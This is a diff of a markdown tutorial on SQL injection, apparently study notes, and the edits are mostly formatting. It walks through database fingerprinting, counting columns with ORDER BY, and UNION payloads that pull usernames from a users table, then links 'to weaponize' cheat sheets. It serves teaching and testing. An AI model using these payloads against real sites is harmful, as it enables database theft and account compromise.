@@ -14,12 +14,12 @@ Also the Operating System can give you some hints:
 - a Microsoft server usually use a MSSQL database
 - a Linux server usually use a MySQL database
 
-This is not a rule! We have some technique to be sure when we are dealing with
+__This is not a rule!__ We have some technique to be sure when we are dealing with
 a non-blind situation (or not).
 
-- Cause an error: the error message will be different for each DBMS (non-blind)
-- Banner grabbing: exploit the injection to get the DB version (non-blind)
-- Inferring from strings: different databases concatenates strings in a different way (blind)
+- __Cause an error__: the error message will be different for each DBMS (non-blind)
+- __Banner grabbing__: exploit the injection to get the DB version (non-blind)
+- __Inferring from strings__: different databases concatenates strings in a different way (blind)
 
 ### DBMS errors
 
@@ -50,7 +50,7 @@ a non-blind situation (or not).
 
 ## 'UNION BASED
 
-The UNION operator allow to combine the result of two or more SELECT statements.
+The UNION operator allow to combine the result of two or more `SELECT` statements.
 
 Basic syntax:
 
@@ -60,7 +60,7 @@ UNION
 SELECT col1, col2, col3, ..., colN FROM table2
 ```
 
-returns a table that contains the results obtained by both the SELECT statements.
+returns a table that contains the results obtained by both the `SELECT` statements.
 
 By default it returns only distinct values.
 
@@ -101,7 +101,7 @@ Given this PHP code:
 
 Using `$_GET[id] = "1' UNION ALL SELECT 1 -- -"`, the query produced will be:
 ```sql
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1 -- -'
+SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1 -- -'
 ```
 It will fail because the number of columns is different.
 
@@ -122,7 +122,7 @@ SELECT id, title, content FROM pages WHERE id = '1' ORDER BY 4 -- -' FAILS!
 
 It will fail with `4` and it means that the table has 3 columns.
 
-ORDER BY approach is faster with a large number of columns. We can also use
+`ORDER BY` approach is faster with a large number of columns. We can also use
 binary search:
 
 Assuming a table with 15 columns:
@@ -146,8 +146,8 @@ Given this PHP code:
 ```
 
 Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 -- -"`, the query produced will be:
-```
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
+```sql
+SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
 ```
 
 We will get:
@@ -159,19 +159,23 @@ We will get:
 
 ### NON-BLIND COLUMNS
 
-`SELECT 1,2,3,...,n` is also useful to identify the output in our page and count
+`SELECT 1, 2, 3, ..., n` is also useful to identify the output in our page and count
 how many columns get printed.
 
 If we got only `1` column that gets printed we can use some trick to output
 multiple columns at once.
 
-`SELECT CONCAT('coppito', 'zero', 'day');`
+`sql
+SELECT CONCAT('coppito', 'zero', 'day');
+`
 Will return `coppitozeroday`
 
-`SELECT CONCAT_WS('_', 'coppito', 'zero', 'day');`
+`sql
+SELECT CONCAT_WS('_', 'coppito', 'zero', 'day');
+`
 Will return `coppito_zero_day`. The first argument is the separator.
 
-How to exploit it?
+#### How to exploit it?
 
 Given this PHP code, and assuming that there is another table, `users`, with `id`,`username`,`password`:
 
@@ -184,17 +188,18 @@ Given this PHP code, and assuming that there is another table, `users`, with `id
 ```
 
 We already tested the number of columns:
-Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 -- -"`, the query produced will be:
-```
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
+
+Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 -- -"` the query produced will be:
+```sql
+SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
 ```
 
-The page will print out also our "2".
+The page will print out also our `2`.
 We can take advantage of this to print out all `username`s from `users` table:
 
-Using `$_GET[id] = "' UNION ALL SELECT 1, username, 3 FROM users -- -"`, the query produced will be:
-```
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, username, 3 FROM users -- -'
+Using `$_GET[id] = "' UNION ALL SELECT 1, username, 3 FROM users -- -"` the query produced will be:
+```sql
+SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, username, 3 FROM users -- -'
 ```
 
 How can we get all the `users` table in one query?
@@ -227,7 +232,7 @@ Our `UNION` result will be stripped out.
 
 Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
 ```
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 FROM users -- -'
+  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 FROM users -- - LIMIT 1'
 ```
 
 We will get:
@@ -240,7 +245,7 @@ We have to add a condition that always makes the WHERE clause false, before our 
 
 Using `$_GET[id] = "'AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
 ```
-  SELECT id, title, content FROM pages WHERE id = '1' AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- -'
+  SELECT id, title, content FROM pages WHERE id = '1' AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- - LIMIT 1'
 ```
 
 We will get:
@@ -250,14 +255,22 @@ We will get:
 | 1 | 2 | 3 |
 
 
-## CHEATSHEET
+## CHEATSHEET (to weaponize)
+
+We have just learned how to get other data using `UNION` exploiting an SQL Injection.
+But how can we discover if there are some other tables? What are the names of the columns? We are DBA?
+
+The cheatsheets come in handy:
 
 MySQL: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
 MSSQL: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+
 ORACLE: http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+
 POSTGRES: http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
 
-LEARN BY HEART!!!!
+__LEARN BY HEART!!!!__
 
 ### MySQL details:
 
@@ -277,4 +290,4 @@ LEARN BY HEART!!!!
 | Avoiding Quotes | `SELECT 0×414243; # returns ABC` |
 | Hostname, IP | `SELECT @@hostname;` |
 
-LEARN BY HEART!!!!
+__LEARN BY HEART!!!!__
